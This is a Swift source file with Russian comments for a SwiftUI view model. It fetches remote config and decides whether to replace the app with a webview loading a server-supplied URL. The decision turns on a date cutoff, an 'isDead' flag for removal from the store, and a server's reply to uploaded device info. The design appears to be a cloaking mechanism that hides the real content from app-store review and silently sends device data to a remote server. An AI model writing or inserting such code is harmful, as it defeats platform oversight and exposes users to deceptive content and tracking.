import SwiftUI
import Combine

// Модель данных для декодирования JSON
struct ConfigResponse: Codable {
    let server1_0: String
    let isAllChangeURL: String
    let isDead: String
    let lastDate: String
    let url_link: String
}

// Модель данных для ответа от server1_0
struct Server1_0Response: Codable {
    let result: Bool
}

class WebViewModel: ObservableObject {
    @Published var url: URL?
    @Published var showWebView: Bool = false
    
    private var cancellables = Set<AnyCancellable>()
    private var appDelegate: AppDelegate
    
    init(appDelegate: AppDelegate) {
        self.appDelegate = appDelegate
        fetchConfig()
    }
    
    func fetchConfig() {
        guard let url = URL(string: "https://appstorage.org/api/conf/gl0ryz0ne") else {
            print("Invalid URL")
            return
        }
        
        URLSession.shared.dataTaskPublisher(for: url)
            .map(\.data)
            .decode(type: ConfigResponse.self, decoder: JSONDecoder())
            .receive(on: DispatchQueue.main)
            .sink(receiveCompletion: { completion in
                switch completion {
                case .finished:
                    break
                case .failure(let error):
                    print("Error fetching config: \(error)")
                }
            }, receiveValue: { [weak self] config in
                self?.handleConfigResponse(config)
            })
            .store(in: &cancellables)
    }
    
    private func handleConfigResponse(_ config: ConfigResponse) {
        let savedURL = UserDefaults.standard.string(forKey: "savedURL")
        let currentDate = Date()
        
        // Форматирование даты из строки
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        guard let lastDate = dateFormatter.date(from: config.lastDate) else {
            print("Invalid lastDate format")
            return
        }
        
        // Проверка параметра isDead
        if config.isDead == "true" {
            // Если приложение удалено из стора, показываем веб-вью
            self.showWebView = true
            self.url = URL(string: config.url_link)
            return
        }
        
        // Проверка даты
        if currentDate < lastDate {
            // Проверка параметра isAllChangeURL
            if config.isAllChangeURL == "true" || savedURL == nil {
                // Если нужно сбросить сохранённую ссылку или ссылки нет
                self.showWebView = true
                self.url = URL(string: config.url_link)
                UserDefaults.standard.set(config.url_link, forKey: "savedURL")
            } else {
                // Отправка данных на сервер1_0
                sendDataToServer(server1_0URL: config.server1_0)
            }
        }
    }
    
    private func sendDataToServer(server1_0URL: String) {
        guard let url = URL(string: server1_0URL) else {
            print("Invalid server1_0 URL")
            return
        }
        
        // Данные устройства из AppDelegate
        let deviceInfo = appDelegate.deviceInfo
        
        // Преобразование данных в JSON
        guard let jsonData = try? JSONSerialization.data(withJSONObject: deviceInfo, options: []) else {
            print("Failed to serialize device info to JSON")
            return
        }
        
        // Настройка запроса
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = jsonData
        
        // Выполнение запроса
        URLSession.shared.dataTaskPublisher(for: request)
            .map(\.data)
            .decode(type: Server1_0Response.self, decoder: JSONDecoder())
            .receive(on: DispatchQueue.main)
            .sink(receiveCompletion: { completion in
                switch completion {
                case .finished:
                    break
                case .failure(let error):
                    print("Error sending data to server1_0: \(error)")
                }
            }, receiveValue: { [weak self] server1_0Response in
                self?.evaluateServer1_0Response(server1_0Response)
            })
            .store(in: &cancellables)
    }
    
    private func evaluateServer1_0Response(_ response: Server1_0Response) {
        if response.result {
            // Если ответ server1_0 == true, не показываем веб-вью
            self.showWebView = false
        } else {
            // Если ответ server1_0 == false, показываем веб-вью
            if let savedURL = UserDefaults.standard.string(forKey: "savedURL") {
                self.url = URL(string: savedURL)
            }
            self.showWebView = true
        }
    }
}
